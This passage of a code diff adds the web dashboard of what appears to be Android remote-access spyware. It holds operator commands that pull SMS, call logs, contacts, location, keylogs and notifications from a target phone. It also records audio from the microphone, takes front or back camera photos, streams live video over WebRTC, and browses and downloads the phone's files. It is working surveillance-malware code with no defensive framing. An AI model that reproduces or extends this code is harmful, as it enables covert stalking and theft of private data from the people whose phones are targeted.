+                                        renderData();
+                                    }
+                                } else {
+                                    alert('Failed to clear notification storage');
+                                }
+                                break;
+                                
+                            case 'delete':
+                                if (actualData.success) {
+                                    alert(`Deleted notification data for ${actualData.date}`);
+                                } else {
+                                    alert('Failed to delete notification data');
+                                }
+                                break;
+                        }
+                    } else {
+                        // Single notification (real-time)
+                        if (!deviceData.notifications) deviceData.notifications = [];
+                        deviceData.notifications.push(actualData);
+                        if (activeTab === 'notifications') {
+                            renderData();
+                        }
+                    }
+                }
+            });
+            
+            // Photos batch processing
+            if (!deviceData.photos) deviceData.photos = [];
+            socket.on('photoData', (data) => {
+                console.log(`Received photo batch ${data.batchIndex}/${data.totalBatches}`);
+                if (data.uniqueId === deviceId) {
+                    // Append batch to existing photos
+                    deviceData.photos = deviceData.photos.concat(data.data);
+                    if (activeTab === 'photos') {
+                        renderData();
+                    }
+                    // Show progress
+                    showProgress(`Loading photos: ${data.batchIndex}/${data.totalBatches}`);
+                }
+            });
+            
+            socket.on('photosComplete', (data) => {
+                console.log('Photos complete:', data);
+                if (data.uniqueId === deviceId) {
+                    hideProgress();
+                    if (activeTab === 'photos') {
+                        renderData();
+                    }
+                }
+            });
+            
+            // Files
+            socket.on('fileListData', (data) => {
+                console.log('Received file list:', data);
+                if (data.uniqueId === deviceId) {
+                    deviceData.files = data.data;
+                    // Update current path if provided
+                    if (data.currentPath) {
+                        currentFilePath = data.currentPath;
+                    }
+                    if (activeTab === 'files') {
+                        renderData();
+                    }
+                }
+            });
+            
+            // Apps
+            socket.on('installedAppsData', (data) => {
+                console.log('Received installed apps:', data);
+                if (data.uniqueId === deviceId) {
+                    if (data.batch) {
+                        // Batched data - accumulate
+                        if (!deviceData.apps) {
+                            deviceData.apps = [];
+                        }
+                        deviceData.apps.push(...data.batch);
+                        
+                        // Update progress
+                        const progress = Math.round((data.batchIndex + 1) / data.totalBatches * 100);
+                        showProgress(`Loading apps... ${progress}% (${deviceData.apps.length}/${data.totalApps})`);
+                        
+                        // Render when complete
+                        if (data.isComplete) {
+                            hideProgress();
+                            if (activeTab === 'apps') {
+                                renderData();
+                            }
+                        }
+                    } else {
+                        // Single-shot data (legacy)
+                        deviceData.apps = data.data;
+                        hideProgress();
+                        if (activeTab === 'apps') {
+                            renderData();
+                        }
+                    }
+                }
+            });
+            
+            socket.on('error', (data) => {
+                if (data.uniqueId === deviceId) {
+                    console.error('Device error:', data);
+                    hideProgress();
+                }
+            });
+            
+            // Handle file download response
+            socket.on('fileDownload', (data) => {
+                if (data.uniqueId === deviceId) {
+                    console.log('File download received:', data.fileName);
+                    hideProgress();
+                    if (data.fileData) {
+                        // Create download link
+                        const link = document.createElement('a');
+                        link.href = 'data:' + (data.mimeType || 'application/octet-stream') + ';base64,' + data.fileData;
+                        link.download = data.fileName;
+                        link.click();
+                    }
+                }
+            });
+        }
+        
+        function renderDeviceInfo() {
+            if (!currentDevice) return;
+            
+            document.getElementById('deviceName').textContent = currentDevice.model || currentDevice.device || 'Unknown Device';
+            document.getElementById('deviceUid').textContent = currentDevice.uniqueId || currentDevice.uid || '-';
+            document.getElementById('androidVersion').textContent = currentDevice.androidVersion || currentDevice.sdk || '-';
+            document.getElementById('manufacturer').textContent = currentDevice.manufacturer || '-';
+            document.getElementById('battery').textContent = (currentDevice.batteryLevel || currentDevice.battery || '-') + '%';
+            document.getElementById('network').textContent = currentDevice.networkType || currentDevice.provider || '-';
+            document.getElementById('phoneNumber').textContent = currentDevice.phoneNumber || currentDevice.phone || '-';
+            document.getElementById('connectedAt').textContent = currentDevice.connectedAt ? new Date(currentDevice.connectedAt).toLocaleString() : '-';
+            
+            const statusEl = document.getElementById('deviceStatus');
+            if (currentDevice.online !== false) {
+                statusEl.className = 'device-status online';
+                statusEl.textContent = 'Online';
+            } else {
+                statusEl.className = 'device-status offline';
+                statusEl.textContent = 'Offline';
+            }
+        }
+        
+        function renderCommands() {
+            const grid = document.getElementById('commandsGrid');
+            grid.innerHTML = commands.map(cmd => `
+                <button class="cmd-btn" onclick="sendCommand('${cmd.id}')" ${loadingCommands[cmd.id] ? 'disabled' : ''} id="cmd-${cmd.id}">
+                    ${loadingCommands[cmd.id] ? '<div class="spinner"></div>' : `
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="${cmd.color}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        ${cmd.icon.split('|').map(p => `<path d="${p}"/>`).join('')}
+                    </svg>`}
+                    <span>${cmd.label}</span>
+                </button>
+            `).join('');
+        }
+        
+        function sendCommand(commandId) {
+            if (!socket || !currentDevice) return;
+            
+            // Special handling for recordAudio - ask for duration
+            if (commandId === 'recordAudio') {
+                const duration = prompt('Enter recording duration in seconds (default: 30):', '30');
+                if (duration === null) return; // User cancelled
+                const durationInt = parseInt(duration) || 30;
+                
+                loadingCommands[commandId] = true;
+                renderCommands();
+                deviceData.audio = null;
+                setActiveTab('audio');
+                
+                socket.emit('adminCommand', {
+                    command: commandId,
+                    targetUniqueId: currentDevice.uniqueId || currentDevice.uid,
+                    duration: durationInt
+                });
+                
+                showProgress(`Recording audio for ${durationInt} seconds...`);
+                setTimeout(() => {
+                    loadingCommands[commandId] = false;
+                    renderCommands();
+                    hideProgress();
+                }, (durationInt + 5) * 1000);
+                return;
+            }
+            
+            // Special handling for takeCameraPhoto - open camera tab with controls
+            if (commandId === 'takeCameraPhoto') {
+                loadingCommands[commandId] = true;
+                renderCommands();
+                deviceData.camera = null;
+                setActiveTab('camera');
+                
+                setTimeout(() => {
+                    loadingCommands[commandId] = false;
+                    renderCommands();
+                }, 1000);
+                return;
+            }
+            
+            loadingCommands[commandId] = true;
+            renderCommands();
+            
+            // Reset data for the command being sent (especially for batched data)
+            const tabMap = {
+                'getSms': 'sms',
+                'getCallLogs': 'calls',
+                'getContacts': 'contacts',
+                'getLocation': 'location',
+                'getInstalledApps': 'apps',
+                'getFiles': 'files',
+                'getPhotos': 'photos',
+                'takeScreenshot': 'screenshot',
+                'getKeylog': 'keylog',
+                'getNotifications': 'notifications'
+            };
+            
+            if (tabMap[commandId]) {
+                deviceData[tabMap[commandId]] = commandId === 'getInstalledApps' || commandId === 'getPhotos' ? [] : null;
+                setActiveTab(tabMap[commandId]);
+            }
+            
+            socket.emit('adminCommand', {
+                command: commandId,
+                targetUniqueId: currentDevice.uniqueId || currentDevice.uid
+            });
+            
+            setTimeout(() => {
+                loadingCommands[commandId] = false;
+                renderCommands();
+            }, 5000);
+        }
+        
+        function setActiveTab(tab) {
+            activeTab = tab;
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.toggle('active', btn.dataset.tab === tab);
+            });
+            renderData();
+        }
+        
+        function renderCameraTab(content, data) {
+            console.log('renderCameraTab called with data:', data);
+            const cameraData = data || {};
+            const hasImage = cameraData.imageData && !cameraData.error;
+            
+            content.innerHTML = `
+                <div class="camera-container" style="max-width: 1000px; margin: 0 auto; padding: 24px;">
+                    <!-- Camera Controls -->
+                    <div class="data-item" style="background: var(--bg-card); border-radius: 12px; padding: 24px; margin-bottom: 20px;">
+                        <h3 style="margin: 0 0 20px 0; font-size: 20px; color: var(--text-primary);">📷 Camera Controls</h3>
+                        
+                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; margin-bottom: 20px;">
+                            <button onclick="takeCameraPhoto('back')" class="camera-action-btn" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
+                                📸 Take Back Photo
+                            </button>
+                            <button onclick="takeCameraPhoto('front')" class="camera-action-btn" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">
+                                🤳 Take Front Photo
+                            </button>
+                            <button onclick="startWebRTCStream('back')" class="camera-action-btn" style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);">
+                                🎥 Live Back Camera (HD)
+                            </button>
+                            <button onclick="startWebRTCStream('front')" class="camera-action-btn" style="background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);">
+                                📹 Live Front Camera (HD)
+                            </button>
+                        </div>
+                        
+                        <div style="background: #1a1a2e; border-radius: 8px; padding: 16px;">
+                            <div style="display: flex; align-items: center; gap: 12px; flex-wrap: wrap;">
+                                <span style="color: var(--text-muted); font-size: 14px;">Quick Actions:</span>
+                                <button onclick="stopWebRTCStream()" class="camera-control-btn" style="background: #ef4444;">
+                                    ⏹️ Stop Live Stream
+                                </button>
+                                <button onclick="switchWebRTCCamera()" class="camera-control-btn" style="background: #8b5cf6;">
+                                    🔄 Switch Camera
+                                </button>
+                                <button onclick="setActiveTab('camera'); renderData();" class="camera-control-btn" style="background: #10b981;">
+                                    🔄 Refresh
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- WebRTC Live Video Feed -->
+                    <div id="webrtcVideoContainer" style="display: none; background: var(--bg-card); border-radius: 12px; padding: 24px; margin-bottom: 20px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+                            <h3 style="margin: 0; font-size: 18px;">🎥 HD Live Stream - <span id="webrtcCameraType">Back</span></h3>
+                            <button onclick="stopWebRTCStream()" style="padding: 8px 16px; background: #ef4444; color: white; border: none; border-radius: 6px; cursor: pointer;">
+                                ⏹️ Stop
+                            </button>
+                        </div>
+                        <div style="background: #000; border-radius: 8px; overflow: hidden; position: relative;">
+                            <video id="webrtcVideo" autoplay playsinline style="width: 100%; height: auto; display: block; max-height: 600px;"></video>
+                            <div id="webrtcStatus" style="position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 8px 16px; border-radius: 6px; color: white; font-size: 14px;">
+                                🔄 Connecting...
+                            </div>
+                        </div>
+                        <div style="margin-top: 12px; text-align: center; color: var(--text-muted); font-size: 14px;">
+                            <p>⚡ Real-time HD video streaming via WebRTC</p>
+                        </div>
+                    </div>
+                    
+                    <!-- Live Camera Feed (Legacy) -->
+                    <div id="liveCameraFeed" style="display: none; background: var(--bg-card); border-radius: 12px; padding: 24px; margin-bottom: 20px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+                            <h3 style="margin: 0; font-size: 18px;">🎥 Live Camera Feed - <span id="liveCameraType">Back</span></h3>
+                            <button onclick="stopLiveCamera()" style="padding: 8px 16px; background: #ef4444; color: white; border: none; border-radius: 6px; cursor: pointer;">
+                                ⏹️ Stop
+                            </button>
+                        </div>
+                        <div id="liveCameraStream" style="background: #000; border-radius: 8px; min-height: 400px; display: flex; align-items: center; justify-content: center; color: var(--text-muted);">
+                            <div style="text-align: center;">
+                                <div class="spinner" style="margin: 0 auto 16px;"></div>
+                                <p>Connecting to camera...</p>
+                            </div>
+                        </div>
+                        <div style="margin-top: 12px; text-align: center; color: var(--text-muted); font-size: 14px;">
+                            <p>⚠️ Live stream updates every 2 seconds</p>
+                        </div>
+                    </div>
+                    
+                    <!-- Captured Photo -->
+                    ${hasImage ? `
+                        <div class="data-item" style="background: var(--bg-card); border-radius: 12px; padding: 24px;">
+                            <div class="data-item-header" style="margin-bottom: 16px;">
+                                <div>
+                                    <strong style="font-size: 18px;">📷 ${escapeHtml(cameraData.fileName || 'Camera Photo')}</strong>
+                                    <div style="color: var(--text-muted); font-size: 14px; margin-top: 4px;">
+                                        Camera: ${escapeHtml(cameraData.cameraType || 'back')} | Size: ${formatFileSize(cameraData.fileSize)} | ${formatDate(cameraData.timestamp)}
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="screenshot-container" style="margin-bottom: 16px;">
+                                <img src="data:image/jpeg;base64,${cameraData.imageData}" alt="Camera Photo" style="max-width: 100%; border-radius: 8px;">
+                            </div>
+                            <div style="text-align: center;">
+                                <button onclick="downloadPhoto('${escapeHtml(cameraData.fileName)}', '${cameraData.imageData}')" 
+                                        style="padding: 12px 24px; background: #6366f1; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 500;">
+                                    📥 Download Photo
+                                </button>
+                            </div>
+                        </div>
+                    ` : (cameraData.error ? `
+                        <div class="empty-data" style="color: #ef4444;">
+                            ❌ Camera Error: ${escapeHtml(cameraData.error)}
+                        </div>
+                    ` : `
+                        <div class="empty-data">
+                            No photo captured yet. Use the buttons above to take a photo or start live camera feed.
+                        </div>
+                    `)}
+                </div>
+            `;
+        }
+        
+        function renderData() {
+            console.log('renderData called for tab:', activeTab);
+            const content = document.getElementById('dataContent');
+            const data = deviceData[activeTab];
+            
+            console.log('Data for', activeTab, ':', data);
+            
+            // Special handling for camera tab - always show controls
+            if (activeTab === 'camera') {
+                console.log('Rendering camera tab...');
+                renderCameraTab(content, data);
+                return;
+            }
+            
+            if (!data || (Array.isArray(data) && data.length === 0)) {
+                content.innerHTML = '<div class="empty-data">No data yet. Click a command above to retrieve data.</div>';
+                return;
+            }
+            
+            switch (activeTab) {
+                case 'sms':
+                    const smsData = Array.isArray(data) ? data : [];
+                    content.innerHTML = smsData.map(sms => `
+                        <div class="data-item">
+                            <div class="data-item-header">
+                                <strong>${sms.address || sms.number || 'Unknown'}</strong>
+                                <span>${sms.date || ''}</span>
+                            </div>
+                            <p>${sms.body || sms.message || 'No content'}</p>
+                        </div>
+                    `).join('') || '<div class="empty-data">No SMS data</div>';
+                    break;
+                    
+                case 'calls':
+                    const callData = Array.isArray(data) ? data : [];
+                    content.innerHTML = callData.map(call => `
+                        <div class="data-item">
+                            <div class="data-item-header">
+                                <strong>${call.number || 'Unknown'}</strong>
+                                <span style="color: ${call.type === 'incoming' ? '#10b981' : call.type === 'outgoing' ? '#3b82f6' : '#ef4444'}">${call.type || 'Unknown'}</span>
+                            </div>
+                            <p>Duration: ${call.duration || 0}s | ${call.date || ''}</p>
+                        </div>
+                    `).join('') || '<div class="empty-data">No call data</div>';
+                    break;
+                    
+                case 'contacts':
+                    const contacts = Array.isArray(data) ? data : [];
+                    content.innerHTML = contacts.map(contact => `
+                        <div class="data-item">
+                            <strong>${contact.name || 'Unknown'}</strong>
+                            <p>${contact.phone || contact.number || 'No number'}</p>
+                        </div>
+                    `).join('') || '<div class="empty-data">No contacts</div>';
+                    break;
+                    
+                case 'location':
+                    content.innerHTML = `
+                        <div class="data-item">
+                            <p><strong>Latitude:</strong> ${data.latitude || 'N/A'}</p>
+                            <p><strong>Longitude:</strong> ${data.longitude || 'N/A'}</p>
+                            <p><strong>Accuracy:</strong> ${data.accuracy || 'N/A'}m</p>
+                            ${data.latitude && data.longitude ? `
+                                <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}" target="_blank" style="color: #6366f1; margin-top: 12px; display: inline-block;">
+                                    Open in Google Maps
+                                </a>
+                            ` : ''}
+                        </div>
+                    `;
+                    break;
+                    
+                case 'photos':
+                    const photos = Array.isArray(data) ? data : [];
+                    if (photos.length > 0) {
+                        content.innerHTML = '<div class="gallery-grid">' + photos.map((photo, index) => `
+                            <div class="gallery-item" onclick="openImageModal(${index})">
+                                <img src="data:image/jpeg;base64,${photo.image64}" alt="${photo.name}" loading="lazy">
+                                <div class="gallery-item-info">
+                                    <div class="gallery-item-name">${photo.name}</div>
+                                    <div class="gallery-item-date">${formatDate(photo.date)}</div>
+                                </div>
+                            </div>
+                        `).join('') + '</div>';
+                    } else {
+                        content.innerHTML = '<div class="empty-data">No photos yet. Click "Photos" command above.</div>';
+                    }
+                    break;
+                    
+                case 'apps':
+                    const apps = Array.isArray(data) ? data : [];
+                    if (apps.length > 0) {
+                        // Filter and sort apps
+                        let filteredApps = apps.filter(app => {
+                            // Apply filter
+                            if (appsFilter === 'user' && app.isSystemApp) return false;
+                            if (appsFilter === 'system' && !app.isSystemApp) return false;
+                            
+                            // Apply search
+                            if (appsSearch) {
+                                const searchLower = appsSearch.toLowerCase();
+                                return (app.name || '').toLowerCase().includes(searchLower) ||
+                                       (app.packageName || '').toLowerCase().includes(searchLower);
+                            }
+                            return true;
+                        });
+                        
+                        // Apply sort
+                        filteredApps.sort((a, b) => {
+                            switch (appsSort) {
+                                case 'name-asc':
+                                    return (a.name || '').localeCompare(b.name || '');
+                                case 'name-desc':
+                                    return (b.name || '').localeCompare(a.name || '');
+                                case 'size-desc':
+                                    return (b.versionCode || 0) - (a.versionCode || 0);
+                                case 'date-desc':
+                                    return (b.installTime || 0) - (a.installTime || 0);
+                                default:
+                                    return 0;
+                            }
+                        });
+                        
+                        const userApps = apps.filter(a => !a.isSystemApp).length;
+                        const systemApps = apps.filter(a => a.isSystemApp).length;
+                        
+                        content.innerHTML = `
+                            <div class="apps-controls">
+                                <div class="apps-controls-row">
+                                    <div class="apps-search">
+                                        <span class="apps-search-icon">🔍</span>
+                                        <input type="text" 
+                                               placeholder="Search apps by name or package..." 
+                                               value="${appsSearch}"
+                                               onkeyup="filterApps(this.value)">
+                                    </div>
+                                    <div class="apps-sort">
+                                        <select onchange="sortApps(this.value)">
+                                            <option value="name-asc" ${appsSort === 'name-asc' ? 'selected' : ''}>Name (A-Z)</option>
+                                            <option value="name-desc" ${appsSort === 'name-desc' ? 'selected' : ''}>Name (Z-A)</option>
+                                            <option value="date-desc" ${appsSort === 'date-desc' ? 'selected' : ''}>Recently Installed</option>
+                                        </select>
+                                    </div>
+                                </div>
+                                <div class="apps-controls-row">
+                                    <span class="apps-filter-label">Filter:</span>
+                                    <div class="apps-filter-group">
+                                        <button class="filter-btn ${appsFilter === 'all' ? 'active' : ''}" 
+                                                onclick="setAppsFilter('all')">All (${apps.length})</button>
+                                        <button class="filter-btn ${appsFilter === 'user' ? 'active' : ''}" 
+                                                onclick="setAppsFilter('user')">User Apps (${userApps})</button>
+                                        <button class="filter-btn ${appsFilter === 'system' ? 'active' : ''}" 
+                                                onclick="setAppsFilter('system')">System (${systemApps})</button>
+                                    </div>
+                                    ${appsSearch || appsFilter !== 'all' ? `<span class="apps-stats">Showing <strong>${filteredApps.length}</strong> of <strong>${apps.length}</strong> apps</span>` : ''}
+                                </div>
+                            </div>
+                            <div class="apps-grid">${filteredApps.map(app => `
+                                <div class="app-item">
+                                    ${app.icon ? `<img src="data:image/jpeg;base64,${app.icon}" class="app-icon" alt="${app.name}">` : '<div class="app-icon">📱</div>'}
+                                    <div class="app-info">
+                                        <div class="app-name">${app.name || 'Unknown'}</div>
+                                        <div class="app-package">${app.packageName || ''}</div>
+                                        <span class="app-badge ${app.isSystemApp ? 'system' : 'user'}">
+                                            ${app.isSystemApp ? 'System' : 'User App'}
+                                        </span>
+                                    </div>
+                                </div>
+                            `).join('')}</div>
+                        `;
+                    } else {
+                        content.innerHTML = '<div class="empty-data">No apps data</div>';
+                    }
+                    break;
+                    
+                case 'files':
+                    const files = Array.isArray(data) ? data : [];
+                    let filesHTML = '<div class="files-list">';
+                    
+                    // Add breadcrumb navigation
+                    filesHTML += renderBreadcrumb();
+                    
+                    // Add parent directory link if not at root
+                    if (currentFilePath && currentFilePath !== '/' && currentFilePath !== '/storage/emulated/0') {
+                        const parentPath = currentFilePath.substring(0, currentFilePath.lastIndexOf('/')) || '/';
+                        filesHTML += `
+                            <div class="file-item" onclick="browseDirectory('${parentPath}')" style="background: var(--bg-secondary);">
+                                <div class="file-icon">⬆️</div>
+                                <div class="file-info">
+                                    <div class="file-name"><strong>.. (Parent Directory)</strong></div>
+                                    <div class="file-meta">Go back</div>
+                                </div>
+                            </div>
+                        `;
+                    }
+                    
+                    if (files.length > 0) {
+                        // Sort: folders first, then files, alphabetically
+                        const sortedFiles = files.sort((a, b) => {
+                            if (a.isDirectory !== b.isDirectory) {
+                                return a.isDirectory ? -1 : 1;
+                            }
+                            return (a.name || '').localeCompare(b.name || '');
+                        });
+                        
+                        filesHTML += sortedFiles.map(file => `
+                            <div class="file-item" onclick="${file.isDirectory ? `browseDirectory('${escapeHtml(file.path)}')` : `downloadFile('${escapeHtml(file.path)}', '${escapeHtml(file.name)}')`}">
+                                <div class="file-icon">
+                                    ${file.isDirectory ? '📁' : getFileIcon(file.name)}
+                                </div>
+                                <div class="file-info">
+                                    <div class="file-name">${escapeHtml(file.name)}</div>
+                                    <div class="file-meta">
+                                        ${file.isDirectory ? 'Folder' : formatFileSize(file.size)} • ${formatDate(file.lastModified)}
+                                    </div>
+                                </div>
+                            </div>
+                        `).join('');
+                        filesHTML += '</div>';
+                        content.innerHTML = filesHTML;
+                    } else {
+                        filesHTML += '<div class="empty-data" style="margin-top: 16px;">Empty folder</div></div>';
+                        content.innerHTML = filesHTML;
+                    }
+                    break;
+                    
+                case 'screenshot':
+                    const imgData = data.image || data;
+                    if (imgData) {
+                        content.innerHTML = `
+                            <div class="screenshot-container">
+                                <img src="data:image/png;base64,${imgData}" alt="Screenshot">
+                            </div>
+                        `;
+                    } else {
+                        content.innerHTML = '<div class="empty-data">No screenshot</div>';
+                    }
+                    break;
+                    
+                case 'audio':
+                    if (data && data.audioData && !data.error) {
+                        content.innerHTML = `
+                            <div class="audio-player-container" style="max-width: 800px; margin: 0 auto; padding: 24px;">
+                                <div class="data-item" style="background: var(--bg-card); border-radius: 12px; padding: 24px;">
+                                    <div class="data-item-header" style="margin-bottom: 16px;">
+                                        <div>
+                                            <strong style="font-size: 18px;">🎤 ${escapeHtml(data.fileName || 'Audio Recording')}</strong>
+                                            <div style="color: var(--text-muted); font-size: 14px; margin-top: 4px;">
+                                                Duration: ${data.duration}s | Size: ${formatFileSize(data.fileSize)} | ${formatDate(data.timestamp)}
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div style="background: #1a1a2e; border-radius: 8px; padding: 20px;">
+                                        <audio id="audioPlayer" controls controlsList="nodownload" 
+                                               style="width: 100%; margin-bottom: 16px; height: 54px;"
+                                               preload="auto">
+                                            <source src="data:audio/mp4;base64,${data.audioData}" type="audio/mp4">
+                                            <source src="data:audio/m4a;base64,${data.audioData}" type="audio/x-m4a">
+                                            Your browser does not support audio playback.
+                                        </audio>
+                                        
+                                        <div style="display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;">
+                                            <button onclick="document.getElementById('audioPlayer').currentTime -= 10" 
+                                                    class="audio-control-btn">
+                                                ⏪ -10s
+                                            </button>
+                                            <button onclick="document.getElementById('audioPlayer').currentTime -= 5" 
+                                                    class="audio-control-btn">
+                                                ⏮️ -5s
+                                            </button>
+                                            <button onclick="document.getElementById('audioPlayer').play()" 
+                                                    class="audio-control-btn" style="background: #10b981;">
+                                                ▶️ Play
+                                            </button>
+                                            <button onclick="document.getElementById('audioPlayer').pause()" 
+                                                    class="audio-control-btn" style="background: #ef4444;">
+                                                ⏸️ Pause
+                                            </button>
+                                            <button onclick="document.getElementById('audioPlayer').currentTime += 5" 
+                                                    class="audio-control-btn">
+                                                ⏭️ +5s
+                                            </button>
+                                            <button onclick="document.getElementById('audioPlayer').currentTime += 10" 
+                                                    class="audio-control-btn">
+                                                ⏩ +10s
+                                            </button>
+                                            <button onclick="document.getElementById('audioPlayer').playbackRate = 0.5" 
+                                                    class="audio-control-btn">
+                                                🐌 0.5x
+                                            </button>
+                                            <button onclick="document.getElementById('audioPlayer').playbackRate = 1.0" 
+                                                    class="audio-control-btn">
+                                                🎯 1.0x
+                                            </button>
+                                            <button onclick="document.getElementById('audioPlayer').playbackRate = 1.5" 
+                                                    class="audio-control-btn">
+                                                🚀 1.5x
+                                            </button>
+                                            <button onclick="document.getElementById('audioPlayer').playbackRate = 2.0" 
+                                                    class="audio-control-btn">
+                                                ⚡ 2.0x
+                                            </button>
+                                        </div>
+                                        
+                                        <div style="margin-top: 16px; text-align: center;">
+                                            <button onclick="downloadAudio('${escapeHtml(data.fileName)}', '${data.audioData}')" 
+                                                    style="padding: 12px 24px; background: #6366f1; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 500;">
+                                                📥 Download Audio
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        `;
+                    } else if (data && data.error) {
+                        content.innerHTML = `
+                            <div class="empty-data" style="color: #ef4444;">
+                                ❌ Recording Error: ${escapeHtml(data.error)}
+                            </div>
+                        `;
+                    } else {
+                        content.innerHTML = '<div class="empty-data">No audio recording yet. Click "Record" button to capture audio.</div>';
+                    }
+                    break;
+                    
+                case 'camera':
+                    // This case should not be reached due to early return above
+                    renderCameraTab(content, data);
+                    break;
+                
+                case 'oldcamera':
+                    const cameraData = data || {};
+                    const hasImage = cameraData.imageData && !cameraData.error;
+                    
+                    content.innerHTML = `
+                        <div class="camera-container" style="max-width: 1000px; margin: 0 auto; padding: 24px;">
+                            <!-- Camera Controls -->
+                            <div class="data-item" style="background: var(--bg-card); border-radius: 12px; padding: 24px; margin-bottom: 20px;">
+                                <h3 style="margin: 0 0 20px 0; font-size: 20px; color: var(--text-primary);">📷 Camera Controls</h3>
+                                
+                                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; margin-bottom: 20px;">
+                                    <button onclick="takeCameraPhoto('back')" class="camera-action-btn" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
+                                        📸 Take Back Photo
+                                    </button>
+                                    <button onclick="takeCameraPhoto('front')" class="camera-action-btn" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">
+                                        🤳 Take Front Photo
+                                    </button>
+                                    <button onclick="startLiveCamera('back')" class="camera-action-btn" style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);">
+                                        🎥 Live Back Camera
+                                    </button>
+                                    <button onclick="startLiveCamera('front')" class="camera-action-btn" style="background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);">
+                                        📹 Live Front Camera
+                                    </button>
+                                </div>
+                                
+                                <div style="background: #1a1a2e; border-radius: 8px; padding: 16px;">
+                                    <div style="display: flex; align-items: center; gap: 12px; flex-wrap: wrap;">
+                                        <span style="color: var(--text-muted); font-size: 14px;">Quick Actions:</span>
+                                        <button onclick="stopLiveCamera()" class="camera-control-btn" style="background: #ef4444;">
+                                            ⏹️ Stop Live Stream
+                                        </button>
+                                        <button onclick="switchCamera()" class="camera-control-btn" style="background: #8b5cf6;">
+                                            🔄 Switch Camera
+                                        </button>
+                                        <button onclick="setActiveTab('camera'); renderData();" class="camera-control-btn" style="background: #10b981;">
+                                            🔄 Refresh
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <!-- Live Camera Feed -->
+                            <div id="liveCameraFeed" style="display: none; background: var(--bg-card); border-radius: 12px; padding: 24px; margin-bottom: 20px;">
+                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+                                    <h3 style="margin: 0; font-size: 18px;">🎥 Live Camera Feed - <span id="liveCameraType">Back</span></h3>
+                                    <button onclick="stopLiveCamera()" style="padding: 8px 16px; background: #ef4444; color: white; border: none; border-radius: 6px; cursor: pointer;">
+                                        ⏹️ Stop
+                                    </button>
+                                </div>
+                                <div id="liveCameraStream" style="background: #000; border-radius: 8px; min-height: 400px; display: flex; align-items: center; justify-content: center; color: var(--text-muted);">
+                                    <div style="text-align: center;">
+                                        <div class="spinner" style="margin: 0 auto 16px;"></div>
+                                        <p>Connecting to camera...</p>
+                                    </div>
+                                </div>
+                                <div style="margin-top: 12px; text-align: center; color: var(--text-muted); font-size: 14px;">
+                                    <p>⚠️ Live stream updates every 2 seconds</p>
+                                </div>
+                            </div>
+                            
+                            <!-- Captured Photo -->
+                            ${hasImage ? `
+                                <div class="data-item" style="background: var(--bg-card); border-radius: 12px; padding: 24px;">
+                                    <div class="data-item-header" style="margin-bottom: 16px;">
+                                        <div>
+                                            <strong style="font-size: 18px;">📷 ${escapeHtml(cameraData.fileName || 'Camera Photo')}</strong>
+                                            <div style="color: var(--text-muted); font-size: 14px; margin-top: 4px;">
+                                                Camera: ${escapeHtml(cameraData.cameraType || 'back')} | Size: ${formatFileSize(cameraData.fileSize)} | ${formatDate(cameraData.timestamp)}
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="screenshot-container" style="margin-bottom: 16px;">
+                                        <img src="data:image/jpeg;base64,${cameraData.imageData}" alt="Camera Photo" style="max-width: 100%; border-radius: 8px;">
+                                    </div>
+                                    <div style="text-align: center;">
+                                        <button onclick="downloadPhoto('${escapeHtml(cameraData.fileName)}', '${cameraData.imageData}')" 
+                                                style="padding: 12px 24px; background: #6366f1; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 500;">
+                                            📥 Download Photo
+                                        </button>
+                                    </div>
+                                </div>
+                            ` : (cameraData.error ? `
+                                <div class="empty-data" style="color: #ef4444;">
+                                    ❌ Camera Error: ${escapeHtml(cameraData.error)}
+                                </div>
+                            ` : `
+                                <div class="empty-data">
+                                    No photo captured yet. Use the buttons above to take a photo or start live camera feed.
+                                </div>
+                            `)}
+                        </div>
+                    `;
+                    break;
+                
+                case 'keylog':
+                    const keylogData = Array.isArray(data) ? data : [];
+                    if (keylogData.length > 0) {
+                        // Get unique apps
+                        const uniqueApps = [...new Set(keylogData.map(k => k.appName || k.app || 'Unknown'))].sort();
+                        
+                        // Filter keylogs
+                        let filteredKeylogs = keylogData.filter(keylog => {
+                            // Apply app filter
+                            const appName = keylog.appName || keylog.app || 'Unknown';
+                            if (keylogAppFilter !== 'all' && appName !== keylogAppFilter) return false;
+                            
+                            // Apply search
+                            if (keylogSearch) {
+                                const searchLower = keylogSearch.toLowerCase();
+                                return (appName).toLowerCase().includes(searchLower) ||
+                                       (keylog.text || '').toLowerCase().includes(searchLower);
+                            }
+                            return true;
+                        });
+                        
+                        // Apply sort
+                        filteredKeylogs.sort((a, b) => {
+                            switch (keylogSort) {
+                                case 'date-desc':
+                                    return (b.timestamp || 0) - (a.timestamp || 0);
+                                case 'date-asc':
+                                    return (a.timestamp || 0) - (b.timestamp || 0);
+                                case 'app-asc':
